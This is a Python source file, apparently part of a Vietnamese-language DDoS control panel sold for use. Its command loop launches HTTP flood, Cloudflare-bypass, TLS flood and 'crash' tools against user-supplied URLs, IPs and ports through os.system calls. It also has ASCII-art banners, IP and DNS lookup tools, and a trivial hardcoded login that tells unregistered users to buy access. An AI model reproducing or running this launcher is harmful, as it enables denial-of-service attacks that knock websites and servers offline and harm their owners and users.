# LAYER 7 METHODS
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "HTTP-SPOOF" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "HTTP-HYPER" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "HTTP-SOCKET" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "HTTP-RAW" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "HTTP-RAND" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "CF-BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "UAM" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "HTTP-FLOOD" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "SEVER" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run sever.go -site {url} {method}')
            except IndexError:
                print('Usage: sever <url> <GET/POST>')
                print('Example: sever https://example.com GET')
        elif "HULK" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run hulk.go -site {url} {method} nil')
            except IndexError:
                print('Usage: hulk <url> METHODS<GET/POST>')
                print('Example: hulk http://example.com GET')
        elif "TLSv2" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node tls2_flood GET {url} proxies.txt {time} 1000 {threads}')
            except IndexError:
                print('Usage: tls2_flood <url> <time> <threads>')
                print('Example: tls2_flood http://example.com 120 5')
        elif "HTTP-MIX" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-MIX {url} {time}')
            except IndexError:
                print('Usage: http-mix <url> <time>')
                print('Example: http-mix https://example.com 120')
        elif "STRESSER" in cnc:
            try:
                url = cnc.split()[1]
                port = cnc.split()[2] 
                time = cnc.split()[3]
                timeout = cnc.split()[4]
                os.system(f'go run stress.go {url} {port} 3 2000 {time} {timeout}')
            except IndexError:
                print('Usage: stress <url> <port> <time> <timeout>')
                print('Example: stress https://example.com 443 120 120')
        elif "Vip" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run hulkk.go -site {url} {method} nil')
            except IndexError:
                print('Usage: hulk <url> METHODS<GET/POST>')
                print('Example: hulk http://example.com GET')

# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW AMP METHODS
SPECIAL ► SHOW SPECIAL METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
INFO   ► INFO ADMIN
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Đéo Có Methods - Command Này!")
            except IndexError:
                pass


def login():
    clear()
    user = "1"
    passwd = "1"
    username = input("Tên Đăng Nhập: ")
    password = getpass.getpass(prompt='Mật Khẩu: ')
    if username != user or password != passwd:
        print("")
        print("User Chưa Có Ib Zalo Mua Tool Để Cấp User")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Thanks For Using Tool")
        time.sleep(0.1)
        ascii_vro()
        main()

login()
